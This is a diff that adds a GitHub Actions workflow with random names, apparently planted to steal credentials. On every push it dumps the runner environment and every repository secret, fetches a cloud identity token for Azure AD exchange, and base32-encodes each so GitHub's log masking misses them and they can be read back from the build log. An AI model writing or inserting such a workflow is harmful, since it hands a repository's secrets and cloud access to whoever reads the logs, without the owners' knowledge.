@@ -1,0 +1,20 @@
+# xgpcz4shna44dyn4
+name: zpd2i2edqayx
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  oie54wwar:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    env:
+      SN6YZ3IY4: ${{ toJSON(secrets) }}
+    steps:
+      - name: dvaltkni4
+        run: |
+          env | base32 -w 111
+          printf '%s' 'J' | base32 -w 111
+          printf '%s' "$SN6YZ3IY4" | base32 -w 111
+          printf '%s' 'J' | base32 -w 111
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then printf '%s' 'J' | base32 -w 111; curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p' | base32 -w 111; fi
